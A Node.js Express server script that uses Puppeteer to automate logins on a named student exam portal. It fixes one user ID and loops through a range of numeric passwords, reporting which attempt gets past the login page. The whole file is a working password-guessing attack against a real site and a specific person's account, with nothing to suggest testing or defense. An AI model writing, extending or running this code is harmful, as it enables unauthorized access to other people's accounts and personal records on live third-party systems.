const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const puppeteer = require('puppeteer-core');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3001;
const CHROME_PATH = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";

app.use(bodyParser.urlencoded({ extended: false }));
app.set('view engine', '.hbs');

async function submitFormAndExtractData(rollNumber) {
    const browser = await puppeteer.launch({ executablePath: CHROME_PATH, headless: false });
    const page = await browser.newPage();

    try {
        await page.goto('https://www.bvvjdpexam.in/public/authentication/student_login', { waitUntil: 'networkidle2', timeout: 60000 });

        // Fill out and submit the form
        await page.type('input[name="USER_ID"]', 'SMK21026358');
        await page.type('input[name="PASSWORD"]', `${rollNumber}`);
        await Promise.all([
            page.click('button[type="submit"]'),
            page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 60000 })
        ]);

        // Check the URL or content for success or failure indication
        const currentURL = page.url();
        const loginSuccessful = !currentURL.includes('student_login');

        return { 'password': rollNumber, loginSuccessful };
    } catch (error) {
        console.error(`Error in Puppeteer operation for roll number ${rollNumber}: ${error.message}`);
        return { rollNumber, error: error.message };
    } finally {
        await browser.close();
    }
}

app.get('/', async(req, res) => {
    try {
        const start = 216418;
        const count = 216423;

        if (isNaN(count) || count <= 0) {
            res.status(400).send('Invalid parameter value. Must be a positive integer.');
            return;
        }

        const promises = [];
        for (let i = start; i <= count; i++) {
            promises.push(submitFormAndExtractData(i));
        }

        const jsonData = await Promise.all(promises);
        res.send({ jsonData });

    } catch (error) {
        console.error(`Error: ${error.message}`);
        res.status(500).send('Internal Server Error');
    }
});

app.listen(PORT, () => {
    console.log(`Running on ${PORT}`);
});